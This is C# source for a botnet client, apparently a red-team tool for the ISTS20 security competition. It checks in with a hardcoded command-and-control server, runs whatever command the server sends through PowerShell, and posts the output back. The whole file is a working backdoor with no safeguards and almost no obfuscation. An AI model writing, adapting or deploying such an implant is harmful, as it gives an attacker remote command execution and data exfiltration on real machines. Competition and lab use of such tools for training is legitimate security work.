/*
    This is a C# bot for ISTS20-Botnet.

*/

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using Newtonsoft.Json;

namespace Bot
{
    class Program
    {   
        // The C2's IP
        public static string c2_ip = "10.10.1.116:5000";
        // My team
        public static string team = "5";
        // My IP
        public static string ip = "10.10.1.1";
        // The cuurent user.
        public static string user = "administrator";

        /// <summary>
        /// This function executes a command and eturn the process object.
        /// </summary>
        static Process execute(string command)
        {
            Process process = new Process();
            process.StartInfo.FileName = "powershell.exe";
            // netsh advfirewall show domain state
            process.StartInfo.Arguments = "/c " + command; // Note the /c command (*)
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = false;
            process.Start();
            return process;
        }

        /// <summary>
        /// This function executes a command and eturn the process object.
        /// </summary>
        private static string communicate(string url, string json)
        {
            var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
            httpWebRequest.ContentType = "application/json";
            httpWebRequest.Method = "POST";

            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
            {
                streamWriter.Write(json);
            }

            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
            {
                var result = streamReader.ReadToEnd();
                return result;
            }
        }

        /// <summary>
        /// This function checks in and returns json object of the returned values.
        /// </summary>
        private static dynamic checkin()
        {
            string url = "http://"+ c2_ip + "/callback";
            string json = "{\"team\":\"" + team + "\"," +
                              "\"ip\":\"" + ip + "\"," +
                              "\"user\":\"" + user + "\"}";
            string result = communicate(url, json);
            dynamic jsonR = JsonConvert.DeserializeObject(result);
            return jsonR;

        }

        /// <summary>
        /// This function sends back the output of the execution.
        /// </summary>
        private static dynamic reply(string id, string output)
        {
            string json = "{\"id\":\"" + id + "\"," +
                             "\"results\":\"" + output + "\"}";
            Console.WriteLine(json);
            string url = "http://" + c2_ip + "/callback_post";
            string result = communicate(url, json);
            dynamic jsonR = JsonConvert.DeserializeObject(result);
            return jsonR;
        }



        static void Main(string[] args)
        {
            // Checkin 
            dynamic json = checkin();
            // Convert id varuable to string.
            string id = json.id;
            Console.WriteLine("ID:");
            Console.WriteLine(id);
            // Convert command varuable to string.
            string command = json.command;
            Console.WriteLine("Command to execute:");
            Console.WriteLine(command);
            // Execute and get the output
            Process proc = execute(command);
            string output = proc.StandardOutput.ReadToEnd().TrimEnd();
            Console.WriteLine("Output:");
            Console.WriteLine(output);
            // Send beack the output using the same id.
            reply(id, output);
        }
    }
}

